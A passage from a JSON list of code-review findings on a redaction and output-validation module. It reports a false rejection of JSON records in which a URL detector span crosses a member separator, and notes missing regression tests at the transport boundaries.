    "problem": "The accountability gate runs before the structural walk and rejects any serialization in which a detector span straddles the separator between two members, because such a span is a substring of no scalar. secrets.url-credentials matches across \",\" in {\"docs\":\"https://example.com\",\"note\":\"ping@host.example\"} with value '\"ping', so the payload is refused even though the structural walk produces a safe redacted representation of it.",
    "impact": "A behaviour regression at a public boundary. policies.md (Redaction) requires the safe part to be returned with redaction.state=redacted when it preserves the operation schema; instead prepareOutputForPersistence refuses the write with format-unsafe, so a record holding a host-only URL followed by an address-shaped field cannot be persisted at all. Availability only; nothing is disclosed.",
    "suggested_fix": "Fixed by the same change as T24R#F-001: compare the canonical re-serialization to the original after the structural walk and emit the canonical redacted serialization when they differ, instead of gating on span accountability before the walk. If accountability is retained, run it after the walk and only on the state-none branch.",
    "evidence": "T24-recheck-validator-probe.json f002.urlThenEmailAcrossMembers {ok:false, reasons:[\"serialized-content-mismatch\"]} versus f002.urlThenEmailParsedDirect {ok:true, state:\"redacted\", text:\"{\\\"docs\\\":\\\"https://example.com\\\",\\\"note\\\":\\\"[REDACTED:email]\\\"}\"}; T24-recheck-boundary-probe.json persistence.urlThenEmailFalseRejection allowed:false. Bound: T24-recheck-f002-class-probe.json falseRejections shows three sibling shapes still passing and repoJson reports 0 rejections across 401 real repository JSON files.",
    "confidence": "high",
    "dedupe_key": "afc02:serialized-json:cross-member-span-false-rejection",
    "blocking_merge": true,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/output-validation.ts:548",
        "src/security/guard.ts:59",
        "src/mcp/redact-seam.ts:25",
        "src/memory/write.ts:101",
        "src/wiki/service.ts:829",
        "src/wiki/enrich.ts:856",
        "src/wiki/enrich.ts:1133",
        "src/sac/wiki-owner-writer.ts:129",
        "src/sac/session-wrap-up.ts:140",
        "src/gdskills/project-skills.ts:269",
        "src/metrics/lifecycle.ts:55"
      ],
      "enumeration_method": "Same ctx rg over validateSerializedOutput|validateSerializedContentForTransport|prepareOutputForPersistence as T24R#F-001 for the caller set; the input class was enumerated by replaying the raw-text detector rules that can match across a member separator against a 6-payload matrix and then sweeping 401 real repository JSON files through the adapter to bound the blast radius."
    }
  },
  {
    "id": "F-004",
    "global_id": "T24R#F-004",
    "reviewer": "review-security-code",
    "severity": "info",
    "file": "src/security/output-validation.test.ts",
    "line": 195,
    "symbol": "sensitive-property-name regression",
    "problem": "The F-001 and F-003 closures are pinned only at the pure validator. src/mcp/structural-redaction.test.ts has no secret-property-name or $ref-sibling case, and src/security/persistence-sinks.test.ts has no duplicate-member case, so the public boundaries that T24 actually exercised are unpinned. Disclosed by the implementer and tracked as T32.",
    "impact": "No impact today: this reviewer executed those paths and the transport behaviour is correct. The risk is that a later change to src/mcp/dispatch.ts or the redact seam regresses the boundary while the validator suite stays green, which is how T24 F-001 reached review in the first place.",
    "suggested_fix": "Land T32 with the four transport cases executed in T24-recheck-boundary.ts (secret property name, nested secret property name, $ref sibling, $ref beside $defs) plus the duplicate-member persistence case named in T24R#F-001.",
    "evidence": "bun src/cli.ts ctx rg \"sensitive-property-name|serialized-content-mismatch|unsupported-reference-siblings|srcset|entity\" over the four test files returns 6 matches, all in src/security/output-validation.test.ts and src/security/detect/exfil.test.ts (raw 2026-09-06T13-33-02-726Z_rg.log). Correct transport behaviour confirmed in T24-recheck-boundary-probe.json mcp.secretKey/deepSecretKey/refSibling/refDefsSibling.",
    "confidence": "high",
    "dedupe_key": "afc02:tests:transport-regressions-missing",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": false
  }
]
```
